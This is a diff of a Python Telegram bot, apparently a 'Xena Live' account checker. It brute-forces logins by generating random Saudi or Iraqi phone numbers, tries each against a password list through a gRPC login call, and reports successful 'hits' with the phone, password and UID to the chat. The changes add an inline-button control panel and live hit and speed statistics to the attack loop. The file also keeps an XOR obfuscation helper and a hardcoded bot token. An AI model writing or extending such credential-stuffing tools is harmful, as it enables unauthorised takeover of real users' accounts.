@@ -5,18 +5,16 @@ import time
 import random
 import hashlib
 import threading
-import subprocess
 from datetime import datetime
 import telebot
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 import grpc
-import requests
 
-# قراءة توكن البوت من متغيرات البيئة في Railway لأمان الحساب
 TOKEN = os.getenv("BOT_TOKEN", "8844579780:AAHI93U8a0StTBhwuCEbZJR7qzHpy2BdS3g")
 bot = telebot.TeleBot(TOKEN)
 
 # ══════════════════════════════════════════════════════════
-#  XOR obfuscation — نفس نسخة الكود الأصلي
+#  XOR obfuscation
 # ══════════════════════════════════════════════════════════
 def _xd(b):
     return bytes(c ^ 0x5A for c in b).decode()
@@ -168,64 +166,147 @@ def _gen_phone(cc):
     local = pref + ext
     return c["code"] + "-" + local, "0" + local
 
-# حالة التشغيل الفردي لكل مستخدم
-is_running = False
+# إدارة حالة الفحص المباشر
+checker_state = {
+    "is_running": False,
+    "checked": 0,
+    "hits": 0,
+    "errors": 0,
+    "start_time": 0
+}
+
+def get_main_keyboard(running=False):
+    markup = InlineKeyboardMarkup()
+    if not running:
+        markup.add(
+            InlineKeyboardButton("🚀 بدء الفحص (SA)", callback_data="start_sa"),
+            InlineKeyboardButton("🚀 بدء الفحص (IQ)", callback_data="start_iq")
+        )
+    else:
+        markup.add(
+            InlineKeyboardButton("⏹ إيقاف الفحص", callback_data="stop_checker")
+        )
+    return markup
 
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
-    bot.reply_to(message, " أهلاً بك في بوت فاحص Xena Live.\n\nالأوامر المتاحة:\n/run SA - لبدء الفحص لدولة السعودية\n/stop - لإيقاف الفحص")
+    markup = get_main_keyboard(checker_state["is_running"])
+    bot.send_message(
+        message.chat.id, 
+        "🤖 **أهلاً بك في لوحة تحكم فاحص Xena Live**\n\nاضغط على الزر بالأسفل للتحكم بعملية الفحص:",
+        reply_markup=markup,
+        parse_mode="Markdown"
+    )
 
-@bot.message_handler(commands=['stop'])
-def stop_checker(message):
-    global is_running
-    is_running = False
-    bot.reply_to(message, "⏹ تم إيقاف عملية الفحص بنجاح.")
+@bot.callback_query_handler(func=lambda call: True)
+def callback_query(call):
+    global checker_state
+    data = call.data
 
-@bot.message_handler(commands=['run'])
-def run_checker(message):
-    global is_running
-    if is_running:
-        bot.reply_to(message, "⚠️ الفحص يعمل بالفعل حالياً!")
-        return
-    
-    parts = message.text.split()
-    cc = parts[1].upper() if len(parts) > 1 else "SA"
-    if cc not in COUNTRY_MAP:
-        bot.reply_to(message, f"❌ الدولة غير مدعومة. الدول المتاحة: {list(COUNTRY_MAP.keys())}")
-        return
+    if data.startswith("start_"):
+        if checker_state["is_running"]:
+            bot.answer_callback_query(call.id, "⚠️ الفحص يعمل بالفعل!")
+            return
+        
+        cc = data.split("_")[1].upper()
+        checker_state["is_running"] = True
+        checker_state["checked"] = 0
+        checker_state["hits"] = 0
+        checker_state["errors"] = 0
+        checker_state["start_time"] = time.time()
 
-    is_running = True
-    bot.reply_to(message, f"🚀 بدأ فحص أرقام دولة [{cc}] بنجاح...")
+        bot.answer_callback_query(call.id, f"🚀 بدأ الفحص لدولة {cc}")
+        
+        # تشغيل حلقة الفحص في الخلفية مع تحديث الرسالة تلقائياً
+        threading.Thread(target=run_background_scanner, args=(call.message.chat.id, call.message.message_id, cc), daemon=True).start()
 
-    def background_work():
-        global is_running
-        cli = GrpcClient()
-        checked = 0
-        while is_running:
-            try:
-                phone, first_pw = _gen_phone(cc)
-                for pw in [first_pw] + PASSWORDS:
-                    if not is_running: break
-                    payload = _build_login(phone, pw, cc)
-                    data, err = cli.call(payload)
-                    checked += 1
-                    if not err and data:
-                        res = _parse_login(data)
-                        if res.get("status") == "hit":
-                            hit_msg = (f"🎯 **HIT FOUND!**\n\n"
-                                       f"📱 Phone: `{phone}`\n"
-                                       f"🔑 Pass: `{pw}`\n"
-                                       f"🆔 UID: `{res.get('uid')}`\n"
-                                       f"{res.get}\n"
-                                       f"🔢 Short ID: `{res.get('shortUID')}`")
-                            bot.send_message(message.chat.id, hit_msg, parse_mode="Markdown")
-                            break
-            except Exception as e:
-                time.sleep(1)
-        cli.close()
+    elif data == "stop_checker":
+        if not checker_state["is_running"]:
+            bot.answer_callback_query(call.id, "⚠️ الفحص متوقف أساساً.")
+            return
+        
+        checker_state["is_running"] = False
+        bot.answer_callback_query(call.id, "⏹ تم إيقاف الفحص.")
+        try:
+            bot.edit_message_text(
+                chat_id=call.message.chat.id,
+                message_id=call.message.message_id,
+                text="⏹ **تم إيقاف عملية الفحص بنجاح.**",
+                reply_markup=get_main_keyboard(False),
+                parse_mode="Markdown"
+            )
+        except:
+            pass
 
-    threading.Thread(target=background_work, daemon=True).start()
+def run_background_scanner(chat_id, message_id, cc):
+    global checker_state
+    cli = GrpcClient()
+    last_update_time = 0
+
+    while checker_state["is_running"]:
+        try:
+            phone, first_pw = _gen_phone(cc)
+            for pw in [first_pw] + PASSWORDS:
+                if not checker_state["is_running"]: break
+                
+                payload = _build_login(phone, pw, cc)
+                data, err = cli.call(payload)
+                checker_state["checked"] += 1
+
+                if err:
+                    checker_state["errors"] += 1
+                elif data:
+                    res = _parse_login(data)
+                    if res.get("status") == "hit":
+                        checker_state["hits"] += 1
+                        hit_msg = (f"🎯 **HIT FOUND!**\n\n"
+                                   f"📱 Phone: `{phone}`\n"
+                                   f"🔑 Pass: `{pw}`\n"
+                                   f"🆔 UID: `{res.get('uid')}`\n"
+                                   f"🔢 Short ID: `{res.get('shortUID')}`")
+                        bot.send_message(chat_id, hit_msg, parse_mode="Markdown")
+
+                # تحديث اللوحة التلقائية كل ثانيتين لتفادي الحظر من تلغرام (FloodWait)
+                current_time = time.time()
+                if current_time - last_update_time >= 2.0:
+                    last_update_time = current_time
+                    elapsed = int(current_time - checker_state["start_time"])
+                    speed = checker_state["checked"] / max(elapsed, 1)
+                    
+                    status_text = (
+                        f"🚀 **جاري فحص دولة [{cc}] بثبات...**\n\n"
+                        f"📊 **الإحصائيات المباشرة:**\n"
+                        f"• تم فحص: `{checker_state['checked']}` رقم\n"
+                        f"• الصيد الصحيح (Hits): `{checker_state['hits']}` 🎯\n"
+                        f"• الأخطاء: `{checker_state['errors']}` ⚠️\n"
+                        f"• السرعة: `{speed:.1f} فحص/ثانية` ⚡\n"
+                        f"• الوقت المنقضي: `{elapsed} ثانية` ⏱"
+                    )
+                    try:
+                        bot.edit_message_text(
+                            chat_id=chat_id,
+                            message_id=message_id,
+                            text=status_text,
+                            reply_markup=get_main_keyboard(True),
+                            parse_mode="Markdown"
+                        )
+                    except Exception:
+                        pass
+        except Exception:
+            time.sleep(1)
+
+    cli.close()
+    try:
+        bot.edit_message_text(
+            chat_id=chat_id,
+            message_id=message_id,
+            text=f"⏹ **توقف الفحص نهائياً.**\nالنتائج النهائية:\n• إجمالي الفحص: `{checker_state['checked']}`\n• الصيد: `{checker_state['hits']}`",
+            reply_markup=get_main_keyboard(False),
+            parse_mode="Markdown"
+        )
+    except:
+        pass
 
 if __name__ == "__main__":
-    print("Bot is polling...")
+    print("Bot is running with inline keyboards...")
     bot.infinity_polling()
